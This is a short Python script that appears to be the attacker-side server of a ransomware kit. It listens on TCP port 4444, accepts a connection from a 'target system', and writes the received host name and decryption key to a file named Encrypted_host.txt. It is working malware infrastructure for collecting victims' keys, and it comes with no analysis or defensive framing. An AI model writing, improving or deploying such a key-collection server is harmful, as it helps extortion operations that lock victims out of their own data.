import socket

IP_ADDRESS = '' #Enter your ipaddress
PORT = 4444

print('Creating Socket')

with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s: # A Tcp connection on IPV4 will target system.
	s.bind((IP_ADDRESS,PORT))
	print('Listening for Connections..........')
	s.listen(1)
	conn,addr =s.accept()
	print((f'Connection from {addr} established :)'))

	with conn:
		while True:
			host_and_key = conn.recv(1024).decode()
			with open ('Encrypted_host.txt','a') as f: # Store the decryption key with there host name
				f.write(host_and_key+'\n')
			break

		print('Connection completed and closed!!!  :)')


